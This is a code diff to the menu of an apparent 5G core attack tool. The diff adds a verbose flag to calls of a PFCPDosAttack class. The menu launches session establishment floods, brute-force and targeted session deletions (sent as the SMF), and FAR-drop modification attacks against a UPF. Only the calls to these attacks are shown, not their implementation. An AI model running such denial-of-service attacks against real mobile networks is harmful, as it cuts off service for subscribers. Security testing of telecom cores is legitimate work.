@@ -966,8 +966,9 @@ def main():
         print("Random FAR number (0 to disable): ")
         random_far_number = int(input("# "))
         
-        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port)
+        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
         dos_obj.set_random_far_number(random_far_number)
+
         dos_obj.Start_pfcp_session_establishment_flood(reqNbr=reqNbr, num_threads=num_threads)
         
     if choice == 2:
@@ -987,7 +988,7 @@ def main():
         print("Number of threads: ")
         num_threads = int(input("# "))
         
-        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port)
+        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
         dos_obj.Start_pfcp_session_deletion_bruteforce(reqNbr=reqNbr, num_threads=num_threads)
 
     if choice == 3:
@@ -1005,7 +1006,7 @@ def main():
         print("SEID to delete (in hex): ")
         target_seid = int(input("# "), 0)
         
-        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port)
+        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
         dos_obj.Start_pfcp_session_deletion_targeted(target_seid=target_seid, smf_addr=evil_addr)
     
     if choice == 4:
@@ -1025,7 +1026,7 @@ def main():
         print("Enter the Session range: ")
         session_range = int(input("# "))
         
-        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port)
+        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
         dos_obj.Start_pfcp_session_modification_far_drop_bruteforce(far_range=far_range, session_range=session_range)
 
 
